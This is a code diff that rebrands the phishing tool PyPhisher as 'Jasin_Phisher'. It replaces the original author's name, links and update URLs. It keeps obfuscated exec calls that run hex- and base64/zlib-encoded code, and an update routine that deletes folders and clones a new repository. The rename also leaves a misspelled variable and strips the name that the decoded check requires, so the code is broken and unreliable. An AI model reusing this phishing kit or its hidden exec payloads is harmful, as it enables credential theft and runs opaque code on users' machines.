@@ -32,25 +32,25 @@ logo=f'''
 {blue} |  ___/ | | |  ___/| '_ \| / __| '_ \ / _ \ '__|
 {red} | |   | |_| | |    | | | | \__ \ | | |  __/ |   
 {yellow} |_|    \__, |_|    |_| |_|_|___/_| |_|\___|_|   
-{green}         __/ |                          {cyan}[v1.5]
-{cyan}        |___/                   {red}[By KasRoudra]
+{green}         _ / |                          {cyan}[v1.5]
+{cyan}        |___/                   {red}[By JASIN RAMADANI]
 '''
 
-pyphisherpyphisherpyphisherpyphisherpyphisher = ""
-pyphisherpyphisherpyphisherpyphisherpyphisher += "\x61\x57\x59\x67\x62\x6d\x39\x30\x49\x47"
-pyphisherpyphisherpyphisherpyphisherpyphisher += "\x78\x76\x5a\x32\x38\x75\x5a\x6d\x6c\x75"
-pyphisherpyphisherpyphisherpyphisherpyphisher += "\x5a\x43\x67\x69\x53\x32\x46\x7a\x55\x6d"
-pyphisherpyphisherpyphisherpyphisherpyphisher += "\x39\x31\x5a\x48\x4a\x68\x49\x69\x6b\x68"
-pyphisherpyphisherpyphisherpyphisherpyphisher += "\x50\x53\x30\x78\x4f\x67\x6f\x67\x49\x43"
-pyphisherpyphisherpyphisherpyphisherpyphisher += "\x41\x67\x5a\x58\x68\x70\x64\x43\x67\x69"
-pyphisherpyphisherpyphisherpyphisherpyphisher += "\x51\x6d\x55\x67\x59\x33\x4a\x6c\x59\x58"
-pyphisherpyphisherpyphisherpyphisherpyphisher += "\x52\x70\x64\x6d\x55\x67\x59\x57\x35\x6b"
-pyphisherpyphisherpyphisherpyphisherpyphisher += "\x49\x48\x56\x7a\x5a\x53\x42\x76\x63\x47"
-pyphisherpyphisherpyphisherpyphisherpyphisher += "\x56\x75\x49\x48\x4e\x76\x64\x58\x4a\x6a"
-pyphisherpyphisherpyphisherpyphisherpyphisher += "\x5a\x53\x42\x6a\x62\x32\x52\x6c\x49\x48"
-pyphisherpyphisherpyphisherpyphisherpyphisher += "\x64\x70\x64\x47\x67\x67\x59\x33\x4a\x6c"
-pyphisherpyphisherpyphisherpyphisherpyphisher += "\x5a\x47\x6c\x30\x63\x79\x45\x69\x4b\x51"
-pyphisherpyphisherpyphisherpyphisherpyphisher += "\x6f\x3d"
+jasinphisherjasinphisherjasinphisherjasinphisherjasinphisher = ""
+jasinphisherjasinphisherjasinphisherjasinphisherjasinphisher += "\x61\x57\x59\x67\x62\x6d\x39\x30\x49\x47"
+jasinphisherjasinphisherjasinphisherjasinphisherjasinphisher += "\x78\x76\x5a\x32\x38\x75\x5a\x6d\x6c\x75"
+jasinphisherjasinphisherjasinphisherjasinphisherjasinphisher += "\x5a\x43\x67\x69\x53\x32\x46\x7a\x55\x6d"
+jasinphisherjasinphisherjasinphisherjasinphisherjasinphisher += "\x39\x31\x5a\x48\x4a\x68\x49\x69\x6b\x68"
+jasinphisherjasinphisherjasinphisherjasinphisherjasinphisher += "\x50\x53\x30\x78\x4f\x67\x6f\x67\x49\x43"
+jasinphisherjasinphisherjasinphisherjasinphisherjasinphisher += "\x41\x67\x5a\x58\x68\x70\x64\x43\x67\x69"
+jasinphisherjasinphisherjasinphisherjasinphisherjasinphisherr += "\x51\x6d\x55\x67\x59\x33\x4a\x6c\x59\x58"
+jasinphisherjasinphisherjasinphisherjasinphisherjasinphisher += "\x52\x70\x64\x6d\x55\x67\x59\x57\x35\x6b"
+jasinphisherjasinphisherjasinphisherjasinphisherjasinphisher += "\x49\x48\x56\x7a\x5a\x53\x42\x76\x63\x47"
+jasinphisherjasinphisherjasinphisherjasinphisherjasinphisher += "\x56\x75\x49\x48\x4e\x76\x64\x58\x4a\x6a"
+jasinphisherjasinphisherjasinphisherjasinphisherjasinphisher += "\x5a\x53\x42\x6a\x62\x32\x52\x6c\x49\x48"
+jasinphisherjasinphisherjasinphisherjasinphisherjasinphisher += "\x64\x70\x64\x47\x67\x67\x59\x33\x4a\x6c"
+jasinphisherjasinphisherjasinphisherjasinphisherjasinphisher += "\x5a\x47\x6c\x30\x63\x79\x45\x69\x4b\x51"
+jasinphisherjasinphisherjasinphisherjasinphisherjasinphisher += "\x6f\x3d"
 
 
 
@@ -158,15 +158,15 @@ def update():
     _ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'=UhGYtKAu00QNIBzKStsw2UJFRFl8TehcQM1SKupwy3ll0mI8LqoU3oE8ysoCKugAIl40WT10Sl0UpUKN9iyOwiTyDV0Lx8yLd9zPlMyR9yyIPFTLzJe'))
     git_ver=popen("curl -s -N https://raw.githubusercontent.com/KasRoudra/PyPhisher/main/files/version.txt").read().strip()
     if (version != git_ver and git_ver != "404: Not Found"):
-        changelog=popen("curl -s -N https://raw.githubusercontent.com/KasRoudra/PyPhisher/main/files/changelog.log").read()
+        changelog=popen("curl -s -N https://raw.githubusercontent.com/jasinramadani04/Jasin_Phisher/main/files/changelog.log").read()
         system("clear")
         print(logo)
         print(f"{info}PyPhisher has a new update!\n{info2}Current: {red}{version}\n{info}Available: {green}{git_ver}\n")
-        upask=input(ask+"Do you want to update PyPhisher?[y/n] > "+green)
+        upask=input(ask+"Do you want to update Jasin_Phisher?[y/n] > "+green)
         if upask=="y":
             print(nc)
-            system("cd .. && rm -rf PyPhisher pyphisher && git clone https://github.com/KasRoudra/PyPhisher")
-            sprint("\n"+success+"PyPhisher updated successfully!! Please restart terminal!\n")
+            system("cd .. && rm -rf Jasin_Phisher jasin phisher && git clone https://github.com/jasinramadani04/Jasin_Phisher")
+            sprint("\n"+success+"Jasin_Phisher updated successfully!! Please restart terminal!\n")
             if (changelog != "404: Not Found"):
                 print(info2+"Changelog:\n"+purple+changelog)
             exit()
@@ -234,12 +234,11 @@ def pexit():
 def about():
     system("clear")
     slowprint(logo)
-    print(red+'[ToolName]  '+cyan+' :[PyPhisher] ')
+    print(red+'[ToolName]  '+cyan+' :[Jasin_Phisher] ')
     print(red+'[Version]   '+cyan+' :[1.5]')
-    print(red+'[Author]    '+cyan+' :[KasRoudra] ')
-    print(red+'[Github]    '+cyan+' :[https://github.com/KasRoudra] ')
-    print(red+'[Messenger] '+cyan+' :[https://m.me/KasRoudra]')
-    print(red+'[Email]     '+cyan+' :[kasroudrakrd@gmail.com]')
+    print(red+'[Author]    '+cyan+' :[JasinRamadani] ')
+    print(red+'[Github]    '+cyan+' :[https://github.com/jasinramadani04] ')
+    print(red+'[Email]     '+cyan+' :[jasinramadani04@gmail.com]')
     print()
     print(green+'['+white+'0'+green+']'+yellow+' Exit                     '+     green+'['+white+'99'+green+']'+yellow+'  Main Menu       ')
     print()
@@ -372,7 +371,7 @@ def main():
             break
     while True:
         os.system("clear")
-        exec(__import__("\x62\x61\x73\x65\x36\x34").b64decode(pyphisherpyphisherpyphisherpyphisherpyphisher.encode("\x75\x74\x66\x2d\x38")).decode("\x75\x74\x66\x2d\x38"))
+        exec(__import__("\x62\x61\x73\x65\x36\x34").b64decode(jasinphisherjasinphisherjasinphisherjasinphisherjasinphisher.encode("\x75\x74\x66\x2d\x38")).decode("\x75\x74\x66\x2d\x38"))
         slowprint(logo)
         options()
         choose= input(ask+"Select one of the options > "+nc)
